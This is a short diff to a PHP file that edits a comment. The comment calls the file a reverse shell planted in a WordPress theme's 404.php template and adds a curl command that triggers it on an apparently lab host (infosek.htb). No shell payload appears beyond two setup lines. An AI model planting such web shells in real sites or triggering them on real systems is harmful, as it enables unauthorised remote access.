@@ -1,5 +1,5 @@
 <?php
-// Reverse shell for WordPress 404.php template
+// Reverse shell for WordPress 404.php template. Execute using following example curl http://infosek.htb/v1/wp-content/themes/twentytwenty/404.php
 set_time_limit(0);
 error_reporting(0);
 
